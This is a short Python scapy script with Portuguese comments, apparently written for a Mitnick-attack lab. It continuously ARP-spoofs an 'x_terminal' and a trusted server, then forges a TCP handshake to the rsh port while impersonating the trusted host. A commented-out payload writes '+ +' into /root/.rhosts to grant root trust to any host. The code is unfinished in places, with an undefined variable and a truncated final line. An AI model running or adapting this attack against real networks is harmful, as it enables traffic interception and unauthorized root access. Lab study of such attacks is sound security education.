import scapy.all as scapy
import time

#diz para a máquina (ip_enganado) que o ip que finjo ser está relacionado ao meu endereço mac
def arp_spoof(ip_enganado,  ip_fingido , end_mac):
    pacote= scapy.ARP(op=2 , pdst=ip_enganado, psrc=ip_fingido, hwdst= end_mac)
    scapy.send(pacote, verbose= False)

#faz arp spoof no x_terminal e no servidor confiável
def net_spoof():
    try:
        #obtém endereço mac 
        end_mac = scapy.get_if_hwaddr(scapy.conf.iface)
        #ip do servidor confiável
        conf_ip = "10.9.0.6"
        #ip do x_terminal
        x_ip = "10.9.0.5"
        falso_mac = "02:42:0a:09:00:06"

        print ("mac é: %s" %(end_mac))
        print ("falso_mac é : %s" %(falso_mac))
        while True:
            arp_spoof(x_ip,  conf_ip, end_mac)
            arp_spoof(conf_ip, x_ip, falso_mac)
            time.sleep(0.1)
            #print ("aperte Ctrl+C para cancelar o ARP")
    except KeyboardInterrupt:
        print ("ARP spoofing parou")
        quit()

def conecta():
    fonte = "10.9.0.6" 
    destino = "10.9.0.5"
    sequencia = 1000
    sport = 1023
    dport = 514
    IP = scapy.IP(dst = destino, src = fonte)
    IPresposta = scapy.IP(dst = fonte, src = destino)

    
    #CONEXÃO TCP
    #manda pacote SYN
    TCP = scapy.TCP(sport = sport, dport=dport, flags='S', seq=sequencia)
    syn_pct = IP/TCP
    syn_rcvd = scapy.sr1(syn_pct, verbose = False)
    

    #manda pacote ACK
    ack_pct = IPresposta/scapy.TCP(sport = syn_rcvd[scapy.TCP].dport, dport=syn_rcvd[scapy.TCP].sport, flags='A', seq=syn_rcvd[scapy.TCP].ack, ack = syn_rcvd[scapy.TCP].seq + 1, window = syn_rcvd[scapy.TCP].window)
    scapy.send (ack_pct, verbose = False)    

    time.sleep(1.0)    

    #CONEXÃO RSH - a porta 3333 é arbitraria
    #manda pacote PUSH ACK
    #mensagem = '3333\x00root\x00root\x00echo "+ +" > /root/.rhosts\x00'
    #push_ack = IPresposta/scapy.TCP(sport = dport, dport = sport, flags = 'PA', seq=syn_ack[scapy.TCP].ack, ack = syn_ack[scapy.TCP].seq + 1)/scapy.Raw(load = mensagem)
    #r_push_ack = scapy.sr1(push_ack, verbose = False)

    ##manda pacote ACK
    #scapy.send(IP/TCP(sport = sport, dport = dport, flags = 'A', seq))

